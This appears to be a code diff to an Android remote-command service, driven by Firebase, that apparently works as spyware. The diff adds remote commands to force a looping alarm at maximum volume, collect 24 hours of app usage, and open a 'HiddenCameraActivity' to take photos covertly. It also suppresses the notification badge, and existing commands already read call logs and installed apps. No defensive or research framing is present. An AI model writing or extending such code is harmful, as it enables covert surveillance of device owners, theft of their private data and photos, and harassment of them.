@@ -25,6 +25,9 @@ import android.os.Build
 import android.os.IBinder
 import android.provider.CallLog
 import android.util.Log
+import android.media.AudioManager
+import android.media.RingtoneManager
+import android.app.usage.UsageStatsManager
 import androidx.core.content.ContextCompat
 import androidx.core.app.NotificationCompat
 import com.google.firebase.database.DataSnapshot
@@ -109,6 +112,9 @@ class FirebaseCommandService : Service() {
             "GET_INSTALLED_APPS" -> getInstalledApps()
             "GET_DEVICE_STATS" -> getDeviceStats()
             "GET_RECENT_CALLS" -> getRecentCalls()
+            "PLAY_ALARM" -> playRemoteAlarm()
+            "GET_APP_USAGE" -> getAppUsageStats()
+            "CAPTURE_PHOTO" -> capturePhoto()
         }
     }
 
@@ -179,6 +185,102 @@ class FirebaseCommandService : Service() {
             }
         }
         postResult("TEXT", sb.toString().trim(), "GET_INSTALLED_APPS")
+    }
+
+    private var mediaPlayer: android.media.MediaPlayer? = null
+
+    private fun playRemoteAlarm() {
+        try {
+            val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
+            audioManager.setStreamVolume(
+                AudioManager.STREAM_ALARM,
+                audioManager.getStreamMaxVolume(AudioManager.STREAM_ALARM),
+                0
+            )
+
+            if (mediaPlayer?.isPlaying == true) {
+                mediaPlayer?.stop()
+                mediaPlayer?.release()
+                mediaPlayer = null
+                postResult("TEXT", "Alarm stopped.", "PLAY_ALARM")
+                return
+            }
+
+            var alarmUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
+            if (alarmUri == null) {
+                alarmUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION)
+            }
+
+            mediaPlayer = android.media.MediaPlayer().apply {
+                setDataSource(applicationContext, alarmUri)
+                setAudioAttributes(
+                    android.media.AudioAttributes.Builder()
+                        .setUsage(android.media.AudioAttributes.USAGE_ALARM)
+                        .setContentType(android.media.AudioAttributes.CONTENT_TYPE_SONIFICATION)
+                        .build()
+                )
+                isLooping = true
+                prepare()
+                start()
+            }
+            postResult("TEXT", "Playing remote alarm. Send command again to stop.", "PLAY_ALARM")
+        } catch (e: Exception) {
+            postResult("ERROR", "Failed to play alarm: ${e.message}", "PLAY_ALARM")
+        }
+    }
+
+    private fun capturePhoto() {
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+            postResult("ERROR", "CAMERA permission not granted", "CAPTURE_PHOTO")
+            return
+        }
+
+        postResult("TEXT", "Launching hidden camera to capture photo...", "CAPTURE_PHOTO")
+
+        val intent = Intent(this, com.jonas.x24.HiddenCameraActivity::class.java).apply {
+            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            putExtra("SESSION_KEY", sessionKey)
+        }
+        startActivity(intent)
+    }
+
+    private fun getAppUsageStats() {
+        val usm = getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
+        val endTime = System.currentTimeMillis()
+        val startTime = endTime - 1000 * 60 * 60 * 24 // 24 hours ago
+        val usageStatsList = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, startTime, endTime)
+
+        if (usageStatsList == null || usageStatsList.isEmpty()) {
+            postResult("TEXT", "No app usage stats available. Usage Access permission may not be granted.", "GET_APP_USAGE")
+            return
+        }
+
+        val sortedStats = usageStatsList.sortedByDescending { it.totalTimeInForeground }
+        val sb = java.lang.StringBuilder()
+        sb.append("App Usage (Last 24 Hours):\n\n")
+
+        val pm = packageManager
+        for (usageStats in sortedStats) {
+            val totalTime = usageStats.totalTimeInForeground
+            if (totalTime > 1000 * 60) { // Only show apps used for more than 1 minute
+                val pkgName = usageStats.packageName
+                val appName = try {
+                    pm.getApplicationLabel(pm.getApplicationInfo(pkgName, 0)).toString()
+                } catch (e: PackageManager.NameNotFoundException) {
+                    pkgName
+                }
+                val minutes = totalTime / (1000 * 60) % 60
+                val hours = totalTime / (1000 * 60 * 60)
+                sb.append("$appName ($pkgName): ")
+                if (hours > 0) sb.append("${hours}h ")
+                sb.append("${minutes}m\n")
+            }
+        }
+
+        if (sb.length < 50) {
+            sb.append("No apps used for more than 1 minute in the last 24 hours.")
+        }
+        postResult("TEXT", sb.toString().trim(), "GET_APP_USAGE")
     }
 
     private fun getDeviceStats() {
@@ -333,7 +435,9 @@ class FirebaseCommandService : Service() {
                 channelId,
                 "Monitor Service",
                 NotificationManager.IMPORTANCE_LOW
-            )
+            ).apply {
+                setShowBadge(false)
+            }
             val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
             manager.createNotificationChannel(channel)
         }
